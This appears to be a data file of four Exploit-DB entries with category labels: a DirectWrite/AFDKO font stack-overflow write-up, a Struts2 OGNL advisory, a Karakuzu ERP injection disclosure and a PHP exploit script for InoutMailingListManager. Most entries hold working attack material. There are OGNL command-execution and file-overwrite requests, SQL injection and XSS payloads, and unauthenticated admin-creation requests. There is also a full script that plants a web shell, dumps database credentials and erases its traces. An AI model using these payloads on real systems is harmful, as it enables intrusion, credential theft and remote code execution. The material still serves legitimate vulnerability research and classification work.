47092,"Microsoft DirectWrite / AFDKO - Stack Corruption in OpenType Font Handling Due to Incorrect Handling of blendArray -----=====[ Background ]=====-----  AFDKO (Adobe Font Development Kit for OpenType) is a set of tools for examining, modifying and building fonts. The core part of this toolset is a font handling library written in C, which provides interfaces for reading and writing Type 1, OpenType, TrueType (to some extent) and several other font formats. While the library existed as early as 2000, it was open-sourced by Adobe in 2014 on GitHub [1, 2], and is still actively developed. The font parsing code can be generally found under afdko/c/public/lib/source/*read/*.c in the project directory tree.  At the time of this writing, based on the available source code, we conclude that AFDKO was originally developed to only process valid, well-formatted font files. It contains very few to no sanity checks of the input data, which makes it susceptible to memory corruption issues (e.g. buffer overflows) and other memory safety problems, if the input file doesn't conform to the format specification.  We have recently discovered that starting with Windows 10 1709 (Fall Creators Update, released in October 2017), Microsoft's DirectWrite library [3] includes parts of AFDKO, and specifically the modules for reading and writing OpenType/CFF fonts (internally called cfr/cfw). The code is reachable through dwrite!AdobeCFF2Snapshot, called by methods of the FontInstancer class, called by dwrite!DWriteFontFace::CreateInstancedStream and dwrite!DWriteFactory::CreateInstancedStream. This strongly indicates that the code is used for instancing the relatively new variable fonts [4], i.e. building a single instance of a variable font with a specific set of attributes. The CreateInstancedStream method is not a member of a public COM interface, but we have found that it is called by d2d1!dxc::TextConvertor::InstanceFontResources, which led us to find out that it can be reached through the Direct2D printing interface. It is unclear if there are other ways to trigger the font instancing functionality.  One example of a client application which uses Direct2D printing is Microsoft Edge. If a user opens a specially crafted website with an embedded OpenType variable font and decides to print it (to PDF, XPS, or another physical or virtual printer), the AFDKO code will execute with the attacker's font file as input. Below is a description of one such security vulnerability in Adobe's library exploitable through the Edge web browser.  -----=====[ Description ]=====-----  The afdko/c/public/lib/source/t2cstr/t2cstr.c file in AFDKO implements the Type 2 CharString interpreter for OpenType fonts. The interpreter stack is represented by the following structure in the t2cCtx object:  --- cut ---     70      struct /* Operand stack */     71      {     72          long cnt;     73          float array[CFF2_MAX_OP_STACK];     74          unsigned short numRegions;     75          long blendCnt;     76          abfOpEntry blendArray[CFF2_MAX_OP_STACK];     77          abfBlendArg blendArgs[T2_MAX_STEMS];     78      } stack; --- cut ---  The ""cnt"" and ""array"" fields correspond to the regular stack used by all kinds of OpenType fonts. The remaining fields only have a purpose in the handling of the new CFF2 format (variable fonts). Whenever a new value is pushed on the stack, it is written to array[] and optionally blendArray[], as seen in the definition of the PUSH() macro:  --- cut ---    153  #define PUSH(v)                                                                                       \    154      {                                                                                                 \    155          if (h->aux->flags & T2C_IS_CFF2) h->stack.blendArray[h->stack.blendCnt++].value = (float)(v); \    156          h->stack.array[h->stack.cnt++] = (float)(v);                                                  \    157      } --- cut ---  However, the reverse POP() macro only pops a value from the main stack, and doesn't touch blendCnt/blendArray:  --- cut ---    152  #define POP() (h->stack.array[--h->stack.cnt]) --- cut ---  This assymetry creates the following problem: there are CFF instructions such as the arithmetic ones, which take values from the top of the stack, use them as factors in some operation, and push the result back. More formally, they pop N values and push back M values, where N != 0, M != 0, N >= M. After executing such an instruction, the stack index is smaller or equal to its previous value.  Because of this, the interpreter doesn't need to check for stack overflow (use the CHKOFLOW macro), and instead must only check if there are enough input values on the stack (with CHKUFLOW). Examples of such behavior are shown below:  --- cut ---   1616                          case tx_abs:   1617                              CHKUFLOW(h, 1);   1618                              {   1619                                  float a = POP();   1620                                  PUSH((a < 0.0f) ? -a : a);   1621                              }   1622                              continue;   1623                          case tx_add:   1624                              CHKUFLOW(h, 2);   1625                              {   1626                                  float b = POP();   1627                                  float a = POP();   1628                                  PUSH(a + b);   1629                              }   1630                              continue; --- cut ---  However, this approach is only valid if the PUSH/POP operations are fully symmetric. In the current state of the code, the execution of each such instruction increments the blendCnt counter without verifying if it goes out-of-bounds. By executing many such instructions in a variable font, it possible to overflow blendArray[] and corrupt the memory after it, including other fields of the t2cCtx object and further data stored on the thread's native stack. This may eventually lead to arbitrary code execution.  -----=====[ Proof of Concept ]=====-----  The proof of concept file includes a specially crafted CharString for glyph ""A"" of the format:  --- cut --- 1621139584 134217728 div dup exch exch exch exch exch ... --- cut ---  The initial four instructions craft two floats on the stack with a binary representation of 0x41414141. The remaining part of the program is the ""exch"" instruction repeated 30000 times, which keeps the number of elements on the regular stack at 2 (by just continuously exchanging them), while filling out the t2cCtx.stack.blendArray array with more and more data until it is overflown.  -----=====[ Crash logs ]=====-----  A 64-bit ""tx"" utility compiled with AddressSanitizer and a custom patch to insert ASAN redzones in between the t2cCtx structure fields crashes with the following report, when run as ./tx -cff poc.otf:  --- cut --- ================================================================= ==158130==ERROR: AddressSanitizer: use-after-poison on address 0x7ffc38744c30 at pc 0x000000682b20 bp 0x7ffc3873e950 sp 0x7ffc3873e948 WRITE of size 4 at 0x7ffc38744c30 thread T0     #0 0x682b1f in t2Decode afdko/c/public/lib/source/t2cstr/t2cstr.c:1729:33     #1 0x670a5b in t2cParse afdko/c/public/lib/source/t2cstr/t2cstr.c:2591:18     #2 0x542960 in readGlyph afdko/c/public/lib/source/cffread/cffread.c:2927:14     #3 0x541c32 in cfrIterateGlyphs afdko/c/public/lib/source/cffread/cffread.c:2966:9     #4 0x509662 in cfrReadFont afdko/c/tx/source/tx.c:151:18     #5 0x508cc3 in doFile afdko/c/tx/source/tx.c:429:17     #6 0x506b2e in doSingleFileSet afdko/c/tx/source/tx.c:488:5     #7 0x4fc91e in parseArgs afdko/c/tx/source/tx.c:558:17     #8 0x4f9470 in main afdko/c/tx/source/tx.c:1631:9     #9 0x7fc9e2d372b0 in __libc_start_main     #10 0x41e5b9 in _start  Address 0x7ffc38744c30 is located in stack of thread T0 at offset 10512 in frame     #0 0x66eb8f in t2cParse afdko/c/public/lib/source/t2cstr/t2cstr.c:2523    This frame has 2 object(s):     [32, 757896) 'h' (line 2524) <== Memory access at offset 10512 is inside this variable     [758160, 758376) 'Exception' (line 2586) HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork       (longjmp and C++ exceptions *are* supported) SUMMARY: AddressSanitizer: use-after-poison afdko/c/public/lib/source/t2cstr/t2cstr.c:1729:33 in t2Decode Shadow bytes around the buggy address:   0x1000070e0930: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x1000070e0940: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x1000070e0950: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x1000070e0960: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x1000070e0970: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 =>0x1000070e0980: 00 00 00 00 00 00[f7]f7 f7 f7 f7 f7 f7 f7 f7 f7   0x1000070e0990: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7   0x1000070e09a0: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7   0x1000070e09b0: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7   0x1000070e09c0: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7   0x1000070e09d0: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 Shadow byte legend (one shadow byte represents 8 application bytes):   Addressable:           00   Partially addressable: 01 02 03 04 05 06 07   Heap left redzone:       fa   Freed heap region:       fd   Stack left redzone:      f1   Stack mid redzone:       f2   Stack right redzone:     f3   Stack after return:      f5   Stack use after scope:   f8   Global redzone:          f9   Global init order:       f6   Poisoned by user:        f7   Container overflow:      fc   Array cookie:            ac   Intra object redzone:    bb   ASan internal:           fe   Left alloca redzone:     ca   Right alloca redzone:    cb   Shadow gap:              cc ==158130==ABORTING --- cut ---  The same ""tx"" program compiled without instrumentation crashes when reaching the end of the stack while still trying to write more data to blendArray. The 0x41414141 values written all over the stack can be seen in gdb's corrupted stack trace listing.  --- cut --- Program received signal SIGSEGV, Segmentation fault. 0x00000000004603b4 in t2Decode (h=0x7ffffff60188, offset=23552) at ../../../../../source/t2cstr/t2cstr.c:1730 1730                                    PUSH(a); (gdb) info reg $rax $rsp rax            0x7ffffffff008   140737488351240 rsp            0x7ffffff5fd60   0x7ffffff5fd60 (gdb) p/x $xmm0 $1 = {v4_float = {0xc, 0x0, 0x0, 0x0}, v2_double = {0x0, 0x0}, v16_int8 = {0x41, 0x41, 0x41, 0x41, 0x0 <repeats 12 times>}, v8_int16 = {0x4141, 0x4141,     0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v4_int32 = {0x41414141, 0x0, 0x0, 0x0}, v2_int64 = {0x41414141, 0x0}, uint128 = 0x00000000000000000000000041414141} (gdb) where #0  0x00000000004603b4 in t2Decode (h=0x7ffffff60188, offset=23552) at ../../../../../source/t2cstr/t2cstr.c:1730 #1  0x000000000045cb26 in t2cParse (offset=1094795585, endOffset=83566, aux=0x41414141, gid=2, cff2=0x41414141, glyph=0x6fd6e8, mem=0x7150b8)     at ../../../../../source/t2cstr/t2cstr.c:2591 #2  0x0000000041414141 in ?? () #3  0x00000000007150b8 in ?? () #4  0x0000000041414141 in ?? () #5  0x00007fffffffd620 in ?? () #6  0x0000000041414141 in ?? () #7  0xfffffffffffffffc in ?? () #8  0x0000000041414141 in ?? () #9  0x0000000000474840 in ?? () at ../../../../../source/tx_shared/tx_shared.c:4891 #10 0x0000000041414141 in ?? () (gdb) print h->stack.blendCnt $2 = 40551 --- cut ---  The Microsoft Edge renderer process crashes while trying to dereference a partially overwritten h->aux pointer:  --- cut --- (51fc.496c): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. DWrite!t2Decode+0x119c: 00007ffb`29e82710 f60080          test    byte ptr [rax],80h ds:000001d3`41414141=?? 0:038> k  # Child-SP          RetAddr           Call Site 00 0000006a`3df8b9e0 00007ffb`29e84a62 DWrite!t2Decode+0x119c 01 0000006a`3df8bb20 00007ffb`29e6c103 DWrite!t2cParse+0x28e 02 0000006a`3df9b480 00007ffb`29e6e3f7 DWrite!readGlyph+0x12b 03 0000006a`3df9b4f0 00007ffb`29e62272 DWrite!cfrIterateGlyphs+0x37 04 0000006a`3df9b540 00007ffb`29df157a DWrite!AdobeCFF2Snapshot+0x19a 05 0000006a`3df9ba40 00007ffb`29df0729 DWrite!FontInstancer::InstanceCffTable+0x212 06 0000006a`3df9bc20 00007ffb`29df039a DWrite!FontInstancer::CreateInstanceInternal+0x249 07 0000006a`3df9be40 00007ffb`29dd5a4e DWrite!FontInstancer::CreateInstance+0x192 08 0000006a`3df9c1a0 00007ffb`34eb61ab DWrite!DWriteFontFace::CreateInstancedStream+0x9e 09 0000006a`3df9c230 00007ffb`34ea9148 d2d1!dxc::TextConvertor::InstanceFontResources+0x19f 0a 0000006a`3df9c350 00007ffb`0fb750f4 d2d1!dxc::CXpsPrintControl::Close+0xc8 0b 0000006a`3df9c3a0 00007ffb`0fb4fcb0 edgehtml!CDXPrintControl::Close+0x44 0c 0000006a`3df9c3f0 00007ffb`0fb547ad edgehtml!CTemplatePrinter::EndPrintD2D+0x5c 0d 0000006a`3df9c420 00007ffb`0fa2b515 edgehtml!CPrintManagerTemplatePrinter::endPrint+0x2d 0e 0000006a`3df9c450 00007ffb`0f689175 edgehtml!CFastDOM::CMSPrintManagerTemplatePrinter::Trampoline_endPrint+0x45 0f 0000006a`3df9c490 00007ffb`0eb568f1 edgehtml!CFastDOM::CMSPrintManagerTemplatePrinter::Profiler_endPrint+0x25 --- cut ---  -----=====[ References ]=====-----  [1] https://blog.typekit.com/2014/09/19/new-from-adobe-type-open-sourced-font-development-tools/ [2] https://github.com/adobe-type-tools/afdko [3] https://docs.microsoft.com/en-us/windows/desktop/directwrite/direct-write-portal [4] https://medium.com/variable-fonts/https-medium-com-tiro-introducing-opentype-variable-fonts-12ba6cd2369   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47092.zip",memory corruption,1
18329,"Apache Struts 2 < 2.3.1 - Multiple Vulnerabilities SEC Consult Vulnerability Lab Security Advisory < 20120104-0 > =======================================================================               title: Multiple critical vulnerabilities in Apache Struts2             product: Apache Struts2                      * OpenSymphony XWork                      * OpenSymphony OGNL  vulnerable version: 2.3.1 and below       fixed version: 2.3.1.1              impact: critical            homepage: http://struts.apache.org/               found: 2011-11-18                  by: Johannes Dahse, Andreas Nusser                      SEC Consult Vulnerability Lab                       https://www.sec-consult.com =======================================================================  Vendor description: ------------------- Apache Struts2 is a web framework for creating Java web applications. It is using the OpenSymphony XWork and OGNL libraries. By default, XWork's ParametersInterceptor treats parameter names provided to actions as OGNL expressions. A OGNL (Object Graph Navigation Language) expression is a limited language similar to Java that is tokenized and parsed by the OGNL parser which invokes appropiate Java methods. This allows e.g. convenient access to properties that have a getter/setter method implemented. By providing a parameter like ""product.id=1"" the OGNL parser will call the appropiate setter getProduct().setId(1) in the current action context. OGNL is also able to call arbitrary methods, constructors and access context variables. For more details please refer to http://commons.apache.org/ognl/language-guide.html.    Vulnerability overview/description: ----------------------------------- To prevent attackers calling arbitrary methods within parameters the flag ""xwork.MethodAccessor.denyMethodExecution"" is set to ""true"" and the SecurityMemberAccess field ""allowStaticMethodAccess"" is set to ""false"" by default. Also, to prevent access to context variables an improved character whitelist for paramteter names is applied in XWork's ParametersInterceptor since Struts 2.2.1.1:  acceptedParamNames = ""[a-zA-Z0-9\\.\\]\\[\\(\\)_'\\s]+"";  Under certain circumstances these restrictions can be bypassed to execute malicious Java code.  1.) Remote command execution in Struts <= 2.2.1.1 (ExceptionDelegator)  When an exception occurs while applying parameter values to properties the value is evaluated as OGNL expression. For example this occurs when setting a string value to a property with type integer. Since the values are not filtered an attacker can abuse the power of the OGNL language to execute arbitrary Java code leading to remote command execution. This issue has been reported (https://issues.apache.org/jira/browse/WW-3668) and was fixed in Struts 2.2.3.1. However the ability to execute arbitrary Java code has been overlooked.  2.) Remote command execution in Struts <= 2.3.1 (CookieInterceptor)  The character whitelist for parameter names is not applied to Struts CookieInterceptor. When Struts is configured to handle cookie names, an attacker can execute arbitrary system commands with static method access to Java functions. Therefore the flag ""allowStaticMethodAccess"" can be set to true within the request.  3.) Arbitrary File Overwrite in Struts <= 2.3.1 (ParametersInterceptor)  Accessing the flag ""allowStaticMethodAccess"" within parameters is prohibited since Struts 2.2.3.1. An attacker can still access public constructors with only one parameter of type String to create new Java objects and access their setters with only one parameter of type String. This can be abused for example to create and overwrite arbitrary files. To inject forbidden characters to the filename an uninitialized string property can be used.  4.) Remote command execution in Struts <= 2.3.1 (DebuggingInterceptor)  While not being a security vulnerability itself, please note that applications running in developer mode and using Struts DebuggingInterceptor are prone to remote command execution as well. While applications should never run in developer mode during production, developers should be aware that doing so not only has performance issues (as documented) but also a critical security impact.   Proof of concept: -----------------  1.) Remote command execution in Struts <= 2.2.1.1 (ExceptionDelegator)  Given Test.java has an property ""id"" of type Integer or Long and appropriate getter and setter methods: 	long id; 	 Given test.jsp with result name=input is configured for action ""Test"": struts.xml: 	<action name=""Test"" class=""example.Test""> 		<result name=""input"">test.jsp</result> 	</action>	  The following request will trigger an exception, the value will be evaluated as OGNL expression and arbitrary Java code can be executed:  	/Test.action?id='%2b(new+java.io.BufferedWriter(new+java.io.FileWriter(""C:/wwwroot/sec-consult.jsp"")).append(""jsp+shell"").close())%2b' 	 An attacker can	also overwrite flags that will allow direct OS command execution: 	/Test.action?id='%2b(%23_memberAccess[""allowStaticMethodAccess""]=true,@java.lang.Runtime@getRuntime().exec('calc'))%2b'  If test.jsp displays the property ""id"" the result of the Java code evaluation can be accessed: 	<%@ taglib prefix=""s"" uri=""/struts-tags"" %> 	<s:property value=""id"" />		 	 2.) Remote command execution in Struts <= 2.3.1 (CookieInterceptor)  Given struts.xml is configured to handle all cookie names (independent of limited cookie values): 	<action name=""Test"" class=""example.Test""> 		<interceptor-ref name=""cookie""> 			<param name=""cookiesName"">*</param> 			<param name=""cookiesValue"">1,2</param> 		</interceptor-ref> 		<result ...> 	</action>  The following HTTP header will execute an OS command when sent to Test.action: 	Cookie: (#_memberAccess[""allowStaticMethodAccess""]\u003dtrue)(x)=1; x[@java.lang.Runtime@getRuntime().exec('calc')]=1  3.) Arbitrary File Overwrite in Struts <= 2.3.1 (ParametersInterceptor)  Given Test.java has an uninitialized property ""name"" of type String: 	String name; // +getter+setter  The following request will create/overwrite the file ""C:/sec-consult.txt"" (empty file): 	/Test.action?name=C:/sec-consult.txt&x[new+java.io.FileWriter(name)]=1 	 The existence of the property 'x' used in these examples is of no importance.  4.) Remote command execution in Struts <= 2.3.1 (DebuggingInterceptor)  Given struts.xml is configured to run in developer mode and to use the debugging interceptor: 	<constant name=""struts.devMode"" value=""true"" /> 	<action name=""Test"" class=""example.Test""> 		<interceptor-ref name=""debugging"" /> 		<result ...> 	</action> 	 The following request will execute arbitrary OGNL expressions leading to remote command execution: 	/Test.action?debug=command&expression=%23_memberAccess[""allowStaticMethodAccess""]=true,@java.lang.Runtime@getRuntime().exec('calc') 	  Vulnerable / tested versions: ----------------------------- All products using Struts2 are affected by at least one critical vulnerability listed above!  Proof of Concept 1.) has been tested with Jetty-6.1.25 26 July 2010 and Struts 2.2.1.1  Proof of Concepts 2.), 3.) and 4.) have been tested with Jetty-6.1.25 26 July 2010 and Struts 2.2.1.1, 2.2.3.1 and 2.3.1   Vendor contact timeline: ------------------------ 2011-12-14: Contacting vendor through security at struts dot apache dot org 2011-12-14: Vendor reply, sending advisory draft 2011-12-14: Vendor released Apache Struts 2.3.1 in parallel 2011-12-16: Vulnerabilities confirmed in Struts 2.3.1, Vendor contacted 2011-12-16: Vendor reply, discussing workaround 2011-12-20: Discussing release of fixed version 2011-12-21: Providing additional information 2012-01-03: Vendor informs that update is ready 2012-01-03: Patch (2.3.1.1) is available   Solution: --------- Update to Struts 2.3.1.1   Workaround: ----------- Update to Struts 2.3.1 and apply a stronger acceptedParamNames filter to the Parameters- and CookieInterceptor:  acceptedParamNames = ""[a-zA-Z0-9\\.\\]\\[_']+"";  Don't run your applications in developer mode.   Advisory URL: ------------- https://www.sec-consult.com/en/advisories.html   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ SEC Consult Unternehmensberatung GmbH  Office Vienna Mooslackengasse 17 A-1190 Vienna Austria  Tel.: +43 / 1 / 890 30 43 - 0 Fax.: +43 / 1 / 890 30 43 - 25 Mail: research at sec-consult dot com https://www.sec-consult.com  EOF J. Dahse, A. Nusser / 2012",execute arbitrary Java code leading to remote command execution,1
47844,"Karakuzu ERP Management Web 5.7.0 - 'k_adi_duz' SQL Injection # Exploit Title: Karakuzu ERP Management Web 5.7.0 - 'k_adi_duz' SQL Injection # Discovery Date: 2019-09-20 # Exploit Author: Hakan TAŞKÖPRÜ # Vendor Homepage: http://karakuzu.info/ # Effected Version <= 5.7.0  Vulnerability #1: Unauthenticated SQL Injection ==================================================  Type: Error-based Title: Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN) Payload: k_adi_duz=USERNAME' WHERE 4964=4964 AND 1355=CTXSYS.DRITHSX.SN(1355,(CHR(113)||CHR(118)||CHR(118)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (1355=1355) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(118)||CHR(118)||CHR(113)))-- DhDH&k_yetki_duz=USER&kullanici_duzenle=  Type: Time-based blind Title: Oracle AND time-based blind Payload: k_adi_duz=USERNAME' WHERE 8074=8074 AND 6437=DBMS_PIPE.RECEIVE_MESSAGE(CHR(122)||CHR(90)||CHR(65)||CHR(88),5)-- VuHD&k_yetki_duz=USER&kullanici_duzenle=  POST /TARGET_PATH/netting/islem2.php HTTP/1.1 Host: TARGET Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded  k_adi_duz=[HERE]&k_email_duz=[HERE]&k_grup_duz=[HERE]&k_yetki_duz=[HERE]&k_sifre_duz=[HERE]&kullanici_duzenle= Description: k_adi_duz, k_email_duz, k_grup_duz, k_yetki_duz and k_sifre_duz parameters are injectable/vulnerable.  Vulnerability #2: Unauthenticated Stored Cross Site Scripting in User Management Panel ======================================================================================= Description : An attacker can stole an admin’s cookie. POST /TARGET_PATH/netting/islem2.php HTTP/1.1 Host: TARGET Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded  k_adi=VULN_USERNAME&k_email=VULN+EMAIL"" onfocus=""alert(1)"" autofocus=""&k_grup=TEST&k_yetki=ROOT&k_sifre=PASSWORD&kullanici_kayit=  Vulnerability #3: Unauthenticated Creating Admin User ====================================================== Description : An attacker can create an admin or normal account.  Request:  POST /TARGET_PATH/netting/islem2.php HTTP/1.1 Host: TARGET Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded k_adi=VULN_USERNAME&k_email=VULN+EMAIL&k_grup=TEST&k_yetki=ROOT&k_sifre=PASSWORD&kullanici_kayit=  Vulnerability #4: Unauthenticated Deleting User ============================================= Description : An attacker can delete an admin or normal account.  POST /TARGET_PATH/netting/islem2.php HTTP/1.1 Host: TARGET Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded  kullanici_sil=k_adi_duz=USERNAME_TO_DELETE  Vulnerability #5: Unauthenticated Editing User =============================================== Description : An attacker can change a user’s password or role(e.g ROOT). POST /TARGET_PATH/netting/islem2.php HTTP/1.1 Host: TARGET Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded k_adi_duz=USERNAME&k_email_duz=VULN+MAIL&k_grup_duz=GROUP&k_yetki_duz=ROOT&k_sifre_duz=NEW_PASSWORD&kullanici_duzenle=  ### History ============= 2019-09-20  Issue discovered 2019-11-19  Vendor contacted (No response) 2020-01-03  Issue published",code execution,1
3702,"InoutMailingListManager 3.1 - Remote Command Execution #!/usr/bin/php -q -d short_open_tag=on <? echo "" InoutMailingListManager <= 3.1 Command Execution Exploit + Login Retrieve + Advisory by BlackHawk <hawkgotyou@gmail.com> <http://itablackhawk.altervista.org> Thanks to rgod for the php code and Marty for the Love ""; if ($argc<4) { echo ""Usage: php "".$argv[0]."" Site CMD Host:          target server (ip/hostname) Path:          path of phpMyNewsletter CMD:           a shell command Example: php "".$argv[0]."" localhost /inout/ cat /etc/password"";  die; }  /* Multiple Vuln can be found in this NewsLetter Script.  I) FCKEditor Vuln  This script uses an old version of FCKEditor, so you can upload arbitrary file with:  [dir]\FCKeditor\editor\filemanager\browser\default\connectors\php\connector.php  (See rgod exploits for more info on it)   II) Login-Bypass  This is the code to check admin rights:  if(!isset($_COOKIE['admin'])) { header(""Location:index.php""); }  1st: everyone can create a cookie named 'admin' 2nd: you neither have to do it, because the script doesn't die after the check..  This exploit Uses this vuln to create the shell. With Admin rights try to upload a PHP attachment, run it to retrieve config.inc.php and create a piggy_marty.php file. After that the script delete the uploaded attachment to leave no trace.  III) SQL Injections  There are SQL Injections EVERYWERE!  one 4 all, changename.php:  $result=mysql_query(""select value from "".$tableprefix.""ea_extraparam where eid=$id"");    BlackHawk <hawkgotyou@gmail.com> */ error_reporting(0); ini_set(""max_execution_time"",0); ini_set(""default_socket_timeout"",5);  function quick_dump($string) {   $result='';$exa='';$cont=0;   for ($i=0; $i<=strlen($string)-1; $i++)   {    if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))    {$result.=""  ."";}    else    {$result.=""  "".$string[$i];}    if (strlen(dechex(ord($string[$i])))==2)    {$exa.="" "".dechex(ord($string[$i]));}    else    {$exa.="" 0"".dechex(ord($string[$i]));}    $cont++;if ($cont==15) {$cont=0; $result.=""\r\n""; $exa.=""\r\n"";}   }  return $exa.""\r\n"".$result; } $proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)'; function sendpacketii($packet) {   global $proxy, $host, $port, $html, $proxy_regex;   if ($proxy=='') {     $ock=fsockopen(gethostbyname($host),$port);     if (!$ock) {       echo 'No response from '.$host.':'.$port; die;     }   }   else { 	$c = preg_match($proxy_regex,$proxy);     if (!$c) {       echo 'Not a valid proxy...';die;     }     $parts=explode(':',$proxy);     echo ""Connecting to "".$parts[0]."":"".$parts[1]."" proxy...\r\n"";     $ock=fsockopen($parts[0],$parts[1]);     if (!$ock) {       echo 'No response from proxy...';die; 	}   }   fputs($ock,$packet);   if ($proxy=='') {     $html='';     while (!feof($ock)) {       $html.=fgets($ock);     }   }   else {     $html='';     while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {       $html.=fread($ock,1);     }   }   fclose($ock); }  $host=$argv[1]; $path=$argv[2]; $port=80; $proxy=""""; $cmd=""""; for ($i=3; $i<=$argc-1; $i++){ $cmd.="" "".$argv[$i]; } $cmd=urlencode($cmd);  if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;} if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}  echo ""Step 0 - Check if piggy_marty.php already exist..\r\n""; $packet =""GET "".$p.""attachments/696969/piggy_marty.php?cmd=$cmd HTTP/1.0\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; $packet.=$data; sendpacketii($packet); if (strstr($html,""666999"")) {   echo ""Exploit succeeded...\r\n"";   $temp=explode(""666999"",$html);   die(""\r\n"".$temp[1].""\r\n""); }  echo ""Step1 - Create a dir for the exploit\r\n""; $packet=""GET "".$p.""attach.php?id=696969 HTTP/1.0\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; sendpacketii($packet); sleep(3); echo ""Step2 - Upload The exploit Creator & Config Disclosure\r\n""; $data=""-----------------------------7d529a1d23092a\r\n""; $data.=""Content-Disposition: form-data; name=\""file\""; filename=\""piggy_marty_creator.php\""\r\n""; $data.=""Content-Type:\r\n\r\n""; $data.=""<?php \$fp=fopen('piggy_marty.php','w'); fputs(\$fp,'<?php error_reporting(0); set_time_limit(0); if (get_magic_quotes_gpc()) { \$_GET[cmd]=stripslashes(\$_GET[cmd]); } echo 666999; passthru(\$_GET[cmd]); echo 666999; ?>'); fclose(\$fp); chmod('piggy_marty.php',777); include '../../config.inc.php'; echo 'delimitator'.\$mysql_server.'|'.\$mysql_username.'|'.\$mysql_password.'|'.\$mysql_dbname.'|'.\$username.'|'.\$password; ?>\r\n""; $data.=""-----------------------------7d529a1d23092a--\r\n""; $packet=""POST "".$p.""attachfiles.php?id=696969 HTTP/1.0\r\n""; $packet.=""CLIENT-IP: 999.999.999.999\r\n"";//spoof $packet.=""Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, * /*\r\n""; $packet.=""Referer: http://"".$host.$path.""/example.html\r\n""; $packet.=""Accept-Language: it\r\n""; $packet.=""Content-Type: multipart/form-data; boundary=---------------------------7d529a1d23092a\r\n""; $packet.=""Accept-Encoding: gzip, deflate\r\n""; $packet.=""User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Content-Length: "".strlen($data).""\r\n""; $packet.=""Connection: Close\r\n""; $packet.=""Cache-Control: no-cache\r\n""; $packet.=""Cookie: admin=BlackHawk\r\n\r\n""; $packet.=$data; sendpacketii($packet); sleep(3); echo ""Step3 - Create The Shell and Retrieve Login Information\r\n""; $packet=""GET "".$p.""attachments/696969/piggy_marty_creator.php HTTP/1.0\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; sendpacketii($packet); $temp=explode('delimitator',$html); list($myserver,$myusername,$mypassword,$mydbname,$lgnusername,$lgnpassword)=explode('|',$temp[1]); echo ""  --- INFO FROM CONFIG.INC.PHP ---  MySQL Server: $myserver MySQL Username: $myusername MySQL Password: $mypassword MySQL Database: $mydbname  Login: $lgnusername Password: $lgnpassword  --- END INFO ---  ""; echo ""Step4 - Remove Shell Creator\r\n""; $packet=""GET "".$p.""attach.php?id=696969 HTTP/1.0\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; sendpacketii($packet); $temp=explode('piggy_marty_creator.php&nbsp;&nbsp;&nbsp; <a href=""removeattach.php?id=',$html); $id=explode('&cid=696969',$temp[1]); $packet=""GET "".$p.""removeattach.php?cid=696969&id="".$id[0]."" HTTP/1.0\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; sendpacketii($packet);  echo ""Step 5 - Check if piggy_marty.php already exist..\r\n""; $packet =""GET "".$p.""attachments/696969/piggy_marty.php?cmd=$cmd HTTP/1.0\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; $packet.=$data; sendpacketii($packet); if (strstr($html,""666999"")) {   echo ""Exploit succeeded...\r\n"";   $temp=explode(""666999"",$html);   die(""\r\n"".$temp[1].""\r\n""); } ?>  # milw0rm.com [2007-04-10]",code execution,1
